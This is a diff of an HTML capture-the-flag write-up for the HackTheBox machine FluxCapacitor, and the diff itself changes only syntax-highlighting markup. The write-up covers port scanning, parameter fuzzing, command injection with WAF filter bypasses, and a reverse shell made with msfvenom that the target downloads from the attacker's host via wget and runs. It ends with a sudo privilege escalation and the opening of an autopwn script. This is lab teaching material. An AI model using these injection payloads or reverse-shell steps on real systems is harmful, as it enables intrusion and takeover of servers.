@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.78.1" />
+<meta name="generator" content="Hugo 0.91.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -315,173 +315,180 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>).</p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.69 500
-
-Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.69
-
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-11 21:23:48 GMT
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65536 ports/host]
-Discovered open port 80/tcp on 10.10.10.69                                     
-                                                                             
-Running command: sudo nmap -A -p80 10.10.10.69
-
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-12 00:27 EEST
-Nmap scan report for node1.fluxcapacitor.htb (10.10.10.69)
-Host is up (0.100s latency).
-
-PORT   STATE SERVICE VERSION
-80/tcp open  http    SuperWAF
-| fingerprint-strings: 
-|   FourOhFourRequest: 
-|     HTTP/1.1 404 Not Found
-|     Date: Fri, 11 May 2018 21:28:20 GMT
-|     Content-Type: text/html
-|     Content-Length: 175
-|     Connection: close
-|     &lt;html&gt;
-|     &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
-|     &lt;body bgcolor=&#34;white&#34;&gt;
-|     &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
-|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   GetRequest: 
-|     HTTP/1.1 200 OK
-|     Date: Fri, 11 May 2018 21:28:19 GMT
-|     Content-Type: text/html
-|     Content-Length: 395
-|     Last-Modified: Tue, 05 Dec 2017 16:02:29 GMT
-|     Connection: close
-|     ETag: &#34;5a26c315-18b&#34;
-|     Server: SuperWAF
-|     Accept-Ranges: bytes
-|     &lt;!DOCTYPE html&gt;
-|     &lt;html&gt;
-|     &lt;head&gt;
-|     &lt;title&gt;Keep Alive&lt;/title&gt;
-|     &lt;/head&gt;
-|     &lt;body&gt;
-|     node1 alive
-|     &lt;!--
-|     Please, add timestamp with something like:
-|     &lt;script&gt; $.ajax({ type: &#34;GET&#34;, url: &#39;/sync&#39; }); &lt;/script&gt;
-|     &lt;hr/&gt;
-|     FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb&lt;br&gt;
-|     &lt;em&gt;&lt;met&gt;&lt;doc&gt;&lt;brown&gt;Roads? Where we&#39;re going, we don&#39;t need roads.&lt;/brown&gt;&lt;/doc&gt;&lt;/met&gt;&lt;/em&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   HTTPOptions: 
-|     HTTP/1.1 405 Not Allowed
-|     Date: Fri, 11 May 2018 21:28:19 GMT
-|     Content-Type: text/html
-|     Content-Length: 179
-|     Connection: close
-|     &lt;html&gt;
-|     &lt;head&gt;&lt;title&gt;405 Not Allowed&lt;/title&gt;&lt;/head&gt;
-|     &lt;body bgcolor=&#34;white&#34;&gt;
-|     &lt;center&gt;&lt;h1&gt;405 Not Allowed&lt;/h1&gt;&lt;/center&gt;
-|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   RTSPRequest: 
-|     &lt;html&gt;
-|     &lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
-|     &lt;body bgcolor=&#34;white&#34;&gt;
-|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
-|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   X11Probe: 
-|     HTTP/1.1 400 Bad Request
-|     Date: Fri, 11 May 2018 21:28:20 GMT
-|     Content-Type: text/html
-|     Content-Length: 179
-|     Connection: close
-|     &lt;html&gt;
-|     &lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
-|     &lt;body bgcolor=&#34;white&#34;&gt;
-|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
-|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
-|     &lt;/body&gt;
-|_    &lt;/html&gt;
-|_http-server-header: SuperWAF
-|_http-title: Keep Alive
-
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%)
-No exact OS matches for host (test conditions non-ideal).</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo htbscan.py 10.10.10.69 <span class="m">500</span>
+<span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.69
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-05-11 21:23:48 GMT
+</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class="go">Initiating SYN Stealth Scan
+</span><span class="go">Scanning 1 hosts [65536 ports/host]
+</span><span class="go">Discovered open port 80/tcp on 10.10.10.69                                     
+</span><span class="go">                                                                             
+</span><span class="go">Running command: sudo nmap -A -p80 10.10.10.69
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-12 00:27 EEST
+</span><span class="go">Nmap scan report for node1.fluxcapacitor.htb (10.10.10.69)
+</span><span class="go">Host is up (0.100s latency).
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">PORT   STATE SERVICE VERSION
+</span><span class="go">80/tcp open  http    SuperWAF
+</span><span class="go">| fingerprint-strings: 
+</span><span class="go">|   FourOhFourRequest: 
+</span><span class="go">|     HTTP/1.1 404 Not Found
+</span><span class="go">|     Date: Fri, 11 May 2018 21:28:20 GMT
+</span><span class="go">|     Content-Type: text/html
+</span><span class="go">|     Content-Length: 175
+</span><span class="go">|     Connection: close
+</span><span class="go">|     &lt;html&gt;
+</span><span class="go">|     &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
+</span><span class="go">|     &lt;body bgcolor=&#34;white&#34;&gt;
+</span><span class="go">|     &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
+</span><span class="go">|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+</span><span class="go">|     &lt;/body&gt;
+</span><span class="go">|     &lt;/html&gt;
+</span><span class="go">|   GetRequest: 
+</span><span class="go">|     HTTP/1.1 200 OK
+</span><span class="go">|     Date: Fri, 11 May 2018 21:28:19 GMT
+</span><span class="go">|     Content-Type: text/html
+</span><span class="go">|     Content-Length: 395
+</span><span class="go">|     Last-Modified: Tue, 05 Dec 2017 16:02:29 GMT
+</span><span class="go">|     Connection: close
+</span><span class="go">|     ETag: &#34;5a26c315-18b&#34;
+</span><span class="go">|     Server: SuperWAF
+</span><span class="go">|     Accept-Ranges: bytes
+</span><span class="go">|     &lt;!DOCTYPE html&gt;
+</span><span class="go">|     &lt;html&gt;
+</span><span class="go">|     &lt;head&gt;
+</span><span class="go">|     &lt;title&gt;Keep Alive&lt;/title&gt;
+</span><span class="go">|     &lt;/head&gt;
+</span><span class="go">|     &lt;body&gt;
+</span><span class="go">|     node1 alive
+</span><span class="go">|     &lt;!--
+</span><span class="go">|     Please, add timestamp with something like:
+</span><span class="go">|     &lt;script&gt; $.ajax({ type: &#34;GET&#34;, url: &#39;/sync&#39; }); &lt;/script&gt;
+</span><span class="go">|     &lt;hr/&gt;
+</span><span class="go">|     FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb&lt;br&gt;
+</span><span class="go">|     &lt;em&gt;&lt;met&gt;&lt;doc&gt;&lt;brown&gt;Roads? Where we&#39;re going, we don&#39;t need roads.&lt;/brown&gt;&lt;/doc&gt;&lt;/met&gt;&lt;/em&gt;
+</span><span class="go">|     &lt;/body&gt;
+</span><span class="go">|     &lt;/html&gt;
+</span><span class="go">|   HTTPOptions: 
+</span><span class="go">|     HTTP/1.1 405 Not Allowed
+</span><span class="go">|     Date: Fri, 11 May 2018 21:28:19 GMT
+</span><span class="go">|     Content-Type: text/html
+</span><span class="go">|     Content-Length: 179
+</span><span class="go">|     Connection: close
+</span><span class="go">|     &lt;html&gt;
+</span><span class="go">|     &lt;head&gt;&lt;title&gt;405 Not Allowed&lt;/title&gt;&lt;/head&gt;
+</span><span class="go">|     &lt;body bgcolor=&#34;white&#34;&gt;
+</span><span class="go">|     &lt;center&gt;&lt;h1&gt;405 Not Allowed&lt;/h1&gt;&lt;/center&gt;
+</span><span class="go">|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+</span><span class="go">|     &lt;/body&gt;
+</span><span class="go">|     &lt;/html&gt;
+</span><span class="go">|   RTSPRequest: 
+</span><span class="go">|     &lt;html&gt;
+</span><span class="go">|     &lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+</span><span class="go">|     &lt;body bgcolor=&#34;white&#34;&gt;
+</span><span class="go">|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+</span><span class="go">|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+</span><span class="go">|     &lt;/body&gt;
+</span><span class="go">|     &lt;/html&gt;
+</span><span class="go">|   X11Probe: 
+</span><span class="go">|     HTTP/1.1 400 Bad Request
+</span><span class="go">|     Date: Fri, 11 May 2018 21:28:20 GMT
+</span><span class="go">|     Content-Type: text/html
+</span><span class="go">|     Content-Length: 179
+</span><span class="go">|     Connection: close
+</span><span class="go">|     &lt;html&gt;
+</span><span class="go">|     &lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+</span><span class="go">|     &lt;body bgcolor=&#34;white&#34;&gt;
+</span><span class="go">|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+</span><span class="go">|     &lt;hr&gt;&lt;center&gt;openresty/1.13.6.1&lt;/center&gt;
+</span><span class="go">|     &lt;/body&gt;
+</span><span class="go">|_    &lt;/html&gt;
+</span><span class="go">|_http-server-header: SuperWAF
+</span><span class="go">|_http-title: Keep Alive
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class="go">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%)
+</span><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></code></pre></div></div>
 
 <h1 id="fuzzing-sync">Fuzzing /Sync</h1>
 
 <p>If we visit <a href="http://10.10.10.69/" target="_blank">http://10.10.10.69/</a> and have a look in the source code, we see this:
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
 	&lt;script&gt; $.ajax({ type: &#34;GET&#34;, url: &#39;/sync&#39; }); &lt;/script&gt;
 ...</code></pre></div></p>
 
 <p>Let&rsquo;s check that url:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">curl http://10.10.10.69/sync --verbose
-
-*   Trying 10.10.10.69...
-* TCP_NODELAY set
-* Connected to 10.10.10.69 (10.10.10.69) port 80 (#0)
-&gt; GET /sync HTTP/1.1
-&gt; Host: 10.10.10.69
-&gt; User-Agent: curl/7.57.0
-&gt; Accept: */*
-&gt; 
-&lt; HTTP/1.1 200 OK
-&lt; Date: Mon, 18 Dec 2017 07:25:54 GMT
-&lt; Content-Type: text/plain
-&lt; Transfer-Encoding: chunked
-&lt; Connection: keep-alive
-&lt; Server: SuperWAF
-&lt; 
-20171218T08:25:54</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">curl http://10.10.10.69/sync --verbose
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">*   Trying 10.10.10.69...
+</span><span class="go">* TCP_NODELAY set
+</span><span class="go">* Connected to 10.10.10.69 (10.10.10.69) port 80 (#0)
+</span><span class="go"></span><span class="gp">&gt; </span>GET /sync HTTP/1.1
+<span class="gp">&gt; </span>Host: 10.10.10.69
+<span class="gp">&gt; </span>User-Agent: curl/7.57.0
+<span class="gp">&gt; </span>Accept: */*
+<span class="gp">&gt; 
+</span><span class="gp"></span>&lt; HTTP/1.1 <span class="m">200</span> OK
+<span class="go">&lt; Date: Mon, 18 Dec 2017 07:25:54 GMT
+</span><span class="go">&lt; Content-Type: text/plain
+</span><span class="go">&lt; Transfer-Encoding: chunked
+</span><span class="go">&lt; Connection: keep-alive
+</span><span class="go">&lt; Server: SuperWAF
+</span><span class="go">&lt; 
+</span><span class="go">20171218T08:25:54
+</span></code></pre></div></div></p>
 
 <p>Note that there is a filter that blocks some user agents. So if you have the word &ldquo;Mozilla&rdquo; or &ldquo;Opera&rdquo; in your user agent string you will get 403 forbidden. Here is the relevant rule from the /usr/local/ope\nresty/nginx/conf/nginx.conf file:
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">    SecRule REQUEST_HEADERS:User-Agent &#34;^(Mozilla|Opera)&#34; &#34;id:1,phase:2,t:trim,block&#34;</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">    SecRule REQUEST_HEADERS:User-Agent &#34;^(Mozilla|Opera)&#34; &#34;id:1,phase:2,t:trim,block&#34;</code></pre></div></p>
 
 <p>Now let&rsquo;s fuzz /sync to see if we find anything interesting:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ wfuzz --hh BBB -H &#34;User-Agent:alamot&#34; -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test
-********************************************************
-* Wfuzz 2.1.5 - The Web Bruteforcer                      *
-********************************************************
-
-Target: http://10.10.10.69/sync/?FUZZ=test
-Total requests: 2589
-
-==================================================================
-ID	Response   Lines      Word         Chars          Request    
-==================================================================
-
-00000:  C=200      2 L	       1 W	     19 Ch	  &#34;not_this&#34;
-00705:  C=403      7 L	      10 W	    175 Ch	  &#34;opt&#34;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>wfuzz --hh BBB -H <span class="s2">&#34;User-Agent:alamot&#34;</span> -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ<span class="o">{</span>not_this<span class="o">}=</span><span class="nb">test</span>
+<span class="go">********************************************************
+</span><span class="go">* Wfuzz 2.1.5 - The Web Bruteforcer                      *
+</span><span class="go">********************************************************
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Target: http://10.10.10.69/sync/?FUZZ=test
+</span><span class="go">Total requests: 2589
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">==================================================================
+</span><span class="go">ID	Response   Lines      Word         Chars          Request    
+</span><span class="go">==================================================================
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">00000:  C=200      2 L	       1 W	     19 Ch	  &#34;not_this&#34;
+</span><span class="go">00705:  C=403      7 L	      10 W	    175 Ch	  &#34;opt&#34;
+</span></code></pre></div></div></p>
 
 <p>We used /sync/?FUZZ{not_this}=test and we hoped to get a different answer for some parameter. The {not_this} is something we know that it doesn&rsquo;t exist and it help us to set the baseline. We are lucky because &ldquo;test&rdquo; is forbidden and we get a different answer when it is used in context with the parameter opt. Other value that would work is for example &ldquo;date&rdquo;. We will see that there is a filter that forbids all the words that there are inside  the /usr/local/openresty/nginx/conf/unixcmd.txt file.</p>
 
 <h2 id="rce">RCE</h2>
 
 <p>We can get RCE like this:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whoami&#39;&#34;
-nobody
-bash: -c: option requires an argument</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whoami&#39;&#34;</span>
+<span class="go">nobody
+</span><span class="go">bash: -c: option requires an argument
+</span></code></pre></div></div></p>
 
 <p>We can bypass some filtering using backslash escape \ or brace expansion []:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whi[c]h mk\nod&#39;&#34;
-/bin/mknod</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/whi[c]h mk\nod&#39;&#34;</span>
+<span class="go">/bin/mknod
+</span></code></pre></div></div></p>
 
 <p>Now, let&rsquo;s examine a little more the point of injection using the command ps:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; p\s aux&#39;&#34;
-nobody   29849  0.0  0.0   4608   868 ?        S    17:19   0:00 sh -c CMD=&#39;/home/themiddle/checksync &#39; p\s aux&#39;&#39;; bash -c ${CMD} 2&gt;&amp;1</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">curl &#34;http://10.10.10.69/sync?opt=&#39; p\s aux&#39;&#34;
+</span><span class="go">nobody   29849  0.0  0.0   4608   868 ?        S    17:19   0:00 sh -c CMD=&#39;/home/themiddle/checksync &#39; p\s aux&#39;&#39;; bash -c ${CMD} 2&gt;&amp;1
+</span></code></pre></div></div></p>
 
 <p>We can get and examine some files like this:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/nginx.conf&#39;&#34; &gt; nginx.conf
-curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/unixcmd.txt&#39;&#34; &gt; unixcmd.txt</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/nginx.conf&#39;&#34; &gt; nginx.conf
+</span><span class="go">curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/conf/unixcmd.txt&#39;&#34; &gt; unixcmd.txt
+</span></code></pre></div></div></p>
 
 <p>If we look inside nginx.conf we see the filtering rules and the command injection point:
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...
     modsecurity on;
         location /sync {
         default_type &#39;text/plain&#39;;
@@ -522,56 +529,64 @@ curl &#34;http://10.10.10.69/sync?opt=&#39; c\at /usr/local/ope\nresty/nginx/con
 <h2 id="getting-xterm-shell">Getting Xterm shell</h2>
 
 <p>Make sure your Xserver is listening to TCP:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ netstat -lntup
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID    
-tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::6000                 :::*                    LISTEN      -                   </code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>netstat -lntup
+<span class="go">Active Internet connections (only servers)
+</span><span class="go">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID    
+</span><span class="go">tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -                   
+</span><span class="go">tcp6       0      0 :::6000                 :::*                    LISTEN      -                   
+</span></code></pre></div></div></p>
 
 <p>New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /etc/X11/xinit/xserverrc
-#!/bin/sh
-if [ -z &#34;$XDG_VTNR&#34; ]; then
-  exec /usr/bin/X -listen tcp &#34;$@&#34;
-else
-  exec /usr/bin/X -listen tcp &#34;$@&#34; vt$XDG_VTNR
-fi</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat /etc/X11/xinit/xserverrc
+<span class="gp">#</span>!/bin/sh
+<span class="go">if [ -z &#34;$XDG_VTNR&#34; ]; then
+</span><span class="go">  exec /usr/bin/X -listen tcp &#34;$@&#34;
+</span><span class="go">else
+</span><span class="go">  exec /usr/bin/X -listen tcp &#34;$@&#34; vt$XDG_VTNR
+</span><span class="go">fi
+</span></code></pre></div></div></p>
 
 <p>Then all you have to do is to allow incoming connections from the specific IP:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ xhost +10.10.10.69</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>xhost +10.10.10.69
+</code></pre></div></div></p>
 
 <p>Now let&rsquo;s connect:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/xter\m -display 10.10.15.203:0&#39;&#34;</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; /usr/bin/xter\m -display 10.10.15.203:0&#39;&#34;</span>
+</code></pre></div></div>
 OR
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; DISPLAY=10.10.15.203:0 /usr/bin/xter\m&#39;&#34;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; DISPLAY=10.10.15.203:0 /usr/bin/xter\m&#39;&#34;</span>
+</code></pre></div></div></p>
 
 <h2 id="getting-a-shell-by-uploading-a-linux-elf">Getting a shell by uploading a linux elf</h2>
 
 <p>We can get a reverse shell this way too:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfvenom -p linux/x86/shell_reverse_tcp  LHOST=10.10.15.15 LPORT=80 -f elf &gt; /var/www/html/index.html
-$ curl &#34;http://10.10.10.69/sync?opt=&#39; w\get 10.10.15.15 -P /tmp&#39;
-$ curl &#34;http://10.10.10.69/sync?opt=&#39; c\hmod +x /tmp/index.html&#39;
-$ curl &#34;http://10.10.10.69/sync?opt=&#39; /tmp/index.html&#39;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfvenom -p linux/x86/shell_reverse_tcp  <span class="nv">LHOST</span><span class="o">=</span>10.10.15.15 <span class="nv">LPORT</span><span class="o">=</span><span class="m">80</span> -f elf &gt; /var/www/html/index.html
+<span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; w\get 10.10.15.15 -P /tmp&#39;
+</span><span class="s2"></span><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; c\hmod +x /tmp/index.html&#39;
+</span><span class="s2"></span><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; /tmp/index.html&#39;
+</span></code></pre></div></div></p>
 
 <p>Don&rsquo;t forget to listen:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nc -lvp 80
-connect to [10.10.15.15 ] from (UNKNOWN) [10.10.15.15 ] 54678
-...</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nc -lvp <span class="m">80</span>
+<span class="go">connect to [10.10.15.15 ] from (UNKNOWN) [10.10.15.15 ] 54678
+</span><span class="go">...
+</span></code></pre></div></div></p>
 
 <h1 id="privilege-escalation">Privilege escalation</h1>
 
 <p>Let&rsquo;s examine if we have sudo:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl &#34;http://10.10.10.69/sync?opt=&#39; sudo -l&#39;&#34;
-
-Matching Defaults entries for nobody on fluxcapacitor:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User nobody may run the following commands on fluxcapacitor:
-    (ALL) ALL
-    (root) NOPASSWD: /home/themiddle/.monit</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>curl <span class="s2">&#34;http://10.10.10.69/sync?opt=&#39; sudo -l&#39;&#34;</span>
+<span class="err">
+</span><span class="err"></span><span class="go">Matching Defaults entries for nobody on fluxcapacitor:
+</span><span class="go">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">User nobody may run the following commands on fluxcapacitor:
+</span><span class="go">    (ALL) ALL
+</span><span class="go">    (root) NOPASSWD: /home/themiddle/.monit
+</span></code></pre></div></div></p>
 
 <p>Nice! Let&rsquo;s check this .monit script:
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">root@fluxcapacitor:/home/themiddle# cat .monit
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@fluxcapacitor:/home/themiddle# cat .monit
 
 <span class="c1">#!/bin/bash</span>
 
@@ -582,17 +597,18 @@ User nobody may run the following commands on fluxcapacitor:
 <span class="k">fi</span></code></pre></div></p>
 
 <p>All it needs is a base64-encoded command argument:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ $ echo -ne cat /root/root.txt | base64
-Y2F0IC9yb290L3Jvb3QudHh0
-
-$ curl -s &#34;http://fluxcapacitor.htb/sync?opt=&#39;\{ sudo /home/themiddle/.monit cmd Y2F0IC9yb290L3Jvb3QudHh0 \}&#39;&#34;
-Trying to execute Y2F0IC9yb290L3Jvb3QudHh0
-bdc89b40eda244649072189a8438b30e</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>$ <span class="nb">echo</span> -ne cat /root/root.txt <span class="p">|</span> base64
+<span class="go">Y2F0IC9yb290L3Jvb3QudHh0
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>curl -s <span class="s2">&#34;http://fluxcapacitor.htb/sync?opt=&#39;\{ sudo /home/themiddle/.monit cmd Y2F0IC9yb290L3Jvb3QudHh0 \}&#39;&#34;</span>
+<span class="go">Trying to execute Y2F0IC9yb290L3Jvb3QudHh0
+</span><span class="go">bdc89b40eda244649072189a8438b30e
+</span></code></pre></div></div></p>
 
 <h1 id="autopwn-script">Autopwn script</h1>
 
 <p>Here is my autopwn script:
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
 <span class="kn">import</span> <span class="nn">base64</span>
 <span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">thread</span>
 <span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib</span>
@@ -618,11 +634,11 @@ bdc89b40eda244649072189a8438b30e</code></pre></div></p>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;I am sending the encoded payload for you...&#34;</span><span class="p">)</span>
         <span class="n">client</span> <span class="o">=</span> <span class="n">NoEncodingSession</span><span class="p">()</span>
-        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span>
